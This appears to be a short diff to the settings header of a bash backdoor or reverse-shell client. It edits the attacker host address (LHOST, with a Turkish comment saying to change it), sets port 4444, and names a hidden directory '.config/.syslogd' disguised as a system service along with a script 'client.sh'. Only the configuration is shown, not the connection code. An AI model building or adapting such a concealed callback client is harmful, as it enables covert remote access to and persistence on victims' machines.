@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # === Settings ===
-LHOST="127.0.0.1"   # Attacker IP (değiştir)
+LHOST="0.0.0.0"   # Attacker IP (değiştir)
 LPORT="4444"            # Port
 HIDE_DIR="$HOME/.config/.syslogd"
 SCRIPT_NAME="client.sh"
